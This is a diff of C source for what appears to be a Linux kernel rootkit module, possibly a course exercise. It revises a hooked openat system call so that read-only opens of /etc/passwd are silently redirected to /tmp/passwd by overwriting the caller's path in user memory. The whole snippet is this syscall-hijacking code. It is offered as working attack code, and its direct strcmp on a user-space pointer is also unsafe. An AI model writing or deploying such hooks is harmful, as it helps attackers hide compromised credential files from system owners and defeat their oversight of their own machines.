@@ -98,13 +98,12 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   const char *pathname = (const char *)regs->si;
+  unsigned int flags = regs->dx;
   // Implement the sneaky part here
-  if (strcmp(pathname, "/etc/passwd") == 0) {
-      char new_path[150];
-      strncpy(new_path, "/tmp/passwd", sizeof(new_path));
-      // Make sure the new path is null-terminated
-      new_path[sizeof(new_path) - 1] = '\0';
-      pathname = new_path;
+  if (strcmp(pathname, "/etc/passwd") == 0 && (flags & O_ACCMODE) == O_RDONLY) {
+        char newPath[] = "/tmp/passwd";
+        copy_to_user((void *)regs->si, newPath, strlen(newPath) + 1);
+        printk(KERN_INFO "sneaky_openat: intercepted open of /etc/passwd\n");
     }
   return (*original_openat)(regs);
 }
